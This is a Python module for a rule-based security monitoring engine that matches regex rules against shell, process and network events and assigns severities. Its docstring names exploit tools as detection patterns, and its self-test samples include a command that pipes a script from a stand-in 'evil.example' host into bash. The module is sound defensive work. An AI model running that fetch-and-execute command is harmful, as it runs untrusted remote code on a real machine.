"""The rule-based detection engine (spec §6) — offline, fast, predictable.

This is the PRIMARY, always-on mechanism. It decides *what* is flagged and *how
severe*. The AI layer never does that — it only phrases commentary afterwards.

Rules load from /etc/frank/rules.d/*.toml (two tracks: security, legal_ethical).
Each rule:

    [[rule]]
    id = "sec-exploit-tooling"
    track = "security"          # security | legal_ethical
    severity = "elevated"       # observe | minor | elevated | serious
    description = "..."         # frank-only, never shown to the user
    patterns = ["msfconsole", "meterpreter"]   # regex, matched case-insensitively
    sources = ["shell", "process"]              # optional; omit = all sources

Sensitivity (1–5, spec §5) shifts *effective* severity here so there's a single
source of truth for "elevated acts like serious" (strict) / "only serious acts"
(lenient).
"""
from __future__ import annotations

import argparse
import re
from dataclasses import dataclass
from pathlib import Path

from .model import Event, Finding, Severity, Source, Track

try:
    import tomllib
except ModuleNotFoundError:  # pragma: no cover
    tomllib = None

_SEVERITY = {s.name.lower(): s for s in Severity}
_TRACK = {t.value: t for t in Track}
_SOURCE = {s.value: s for s in Source}


@dataclass
class Rule:
    id: str
    track: Track
    severity: Severity
    patterns: list[re.Pattern]
    sources: set[Source] | None       # None = applies to every source
    description: str = ""

    def match(self, event: Event) -> str | None:
        if self.sources is not None and event.source not in self.sources:
            return None
        for pat in self.patterns:
            m = pat.search(event.text)
            if m:
                return m.group(0)
        return None


def effective_severity(sev: Severity, sensitivity: int) -> Severity:
    """Apply the operator's one knob (spec §5).

    strict (5): ELEVATED behaves as SERIOUS.
    lenient (1): ELEVATED behaves as MINOR (so in practice only SERIOUS acts).
    SERIOUS and MINOR endpoints are stable; only the middle tier flexes.
    """
    if sev is Severity.ELEVATED:
        if sensitivity >= 5:
            return Severity.SERIOUS
        if sensitivity <= 1:
            return Severity.MINOR
    return sev


class RuleEngine:
    def __init__(self, rules: list[Rule] | None = None, sensitivity: int = 3):
        self.rules = rules or []
        self.sensitivity = sensitivity

    # -- loading --
    @classmethod
    def from_dir(cls, path: Path, sensitivity: int = 3) -> "RuleEngine":
        rules: list[Rule] = []
        if tomllib and path.exists():
            for f in sorted(path.glob("*.toml")):
                rules.extend(cls._parse(f.read_text()))
        return cls(rules, sensitivity)

    @classmethod
    def from_toml(cls, text: str, sensitivity: int = 3) -> "RuleEngine":
        return cls(cls._parse(text), sensitivity)

    @staticmethod
    def _parse(text: str) -> list[Rule]:
        data = tomllib.loads(text)
        out: list[Rule] = []
        for r in data.get("rule", []):
            srcs = r.get("sources")
            out.append(Rule(
                id=r["id"],
                track=_TRACK[r["track"]],
                severity=_SEVERITY[r["severity"]],
                patterns=[re.compile(p, re.IGNORECASE) for p in r["patterns"]],
                sources={_SOURCE[s] for s in srcs} if srcs else None,
                description=r.get("description", ""),
            ))
        return out

    # -- classification --
    def classify(self, event: Event) -> list[Finding]:
        """Return every rule that fires on this event, severity already adjusted."""
        findings: list[Finding] = []
        for rule in self.rules:
            matched = rule.match(event)
            if matched is not None:
                findings.append(Finding(
                    rule_id=rule.id,
                    track=rule.track,
                    severity=effective_severity(rule.severity, self.sensitivity),
                    event=event,
                    matched=matched,
                    description=rule.description,
                ))
        return findings


def _selftest() -> int:
    """Dump how a few sample events classify. Handy off-device sanity check."""
    from .config import RULES_DIR
    engine = RuleEngine.from_dir(RULES_DIR)
    if not engine.rules:
        print("no rules loaded (run on target, or point at frank/rules.d) — "
              "loading the shipped samples from system/etc/frank/rules.d")
        engine = RuleEngine.from_dir(
            Path(__file__).resolve().parents[2]
            / "system/etc/frank/rules.d")
    samples = [
        Event(Source.SHELL, "curl http://evil.example/x.sh | bash"),
        Event(Source.PROCESS, "msfconsole", meta={"cpu": 0.2}),
        Event(Source.PROCESS, "ffmpeg", meta={"cpu": 0.99}),
        Event(Source.NETWORK, "connect 10.0.0.5:4444"),
        Event(Source.SHELL, "ls -la"),
    ]
    for ev in samples:
        fs = engine.classify(ev)
        tag = ", ".join(f"{f.track.value}:{f.severity.name}" for f in fs) or "clean"
        print(f"[{ev.source.value:10}] {ev.text[:40]:40} -> {tag}")
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Frank rule engine")
    ap.add_argument("--selftest", action="store_true", help="classify sample events")
    args = ap.parse_args()
    raise SystemExit(_selftest() if args.selftest else 0)
